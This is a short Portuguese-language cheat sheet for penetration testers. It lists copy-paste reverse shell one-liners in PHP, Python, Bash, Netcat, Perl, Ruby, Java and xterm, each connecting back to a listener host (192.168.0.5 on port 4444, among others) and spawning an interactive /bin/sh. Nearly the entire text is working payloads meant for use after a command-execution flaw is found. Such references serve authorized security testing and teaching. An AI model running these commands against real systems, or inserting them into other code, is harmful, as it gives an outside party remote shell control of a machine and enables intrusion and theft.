Reverse Shell Cheat Sheet
Agora, focando em reverse shell: durante um pentest, caso você tenha a sorte de encontrar uma vulnerabilidade de execução de comando, muito em breve – provavelmente, você precisará de um shell interativo.

Se não for possível adicionar uma nova conta / chave SSH / arquivo .rhosts e apenas efetuar login, sua próxima etapa possivelmente trará um shell reverso ou vinculará um shell a uma porta TCP.

Suas opções para criar um shell reverso são limitadas pelas linguagens de script instaladas no sistema destino, embora você provavelmente possa fazer o upload de um binário caso esteja adequadamente preparado.

Os exemplos mostrados são adaptados para sistemas Unix-like. Alguns dos exemplos a seguir devem funcionar no Windows se você substituir /bin/sh -i por cmd.exe.

Cada um dos métodos abaixo tem como objetivo ser um copiar/colar. São linhas curtas, mas pouco legíveis.

PHP:
 
php -r '$sock=fsockopen("192.168.0.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 
Python:
 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
Bash:
 
bash -i >& /dev/tcp/192.168.0.1/8080 0>&1
 
Netcat:
 
nc -e /bin/sh 192.168.0.5 4444
 
Perl:
 
perl -e 'use Socket;$i="192.168.0.5";$p=4545;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
Ruby:
 
ruby -rsocket -e'f=TCPSocket.open("192.168.0.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
Java:
 
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.0.5/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
 
xterm:
 
xterm -display 192.168.0.5:4444
 
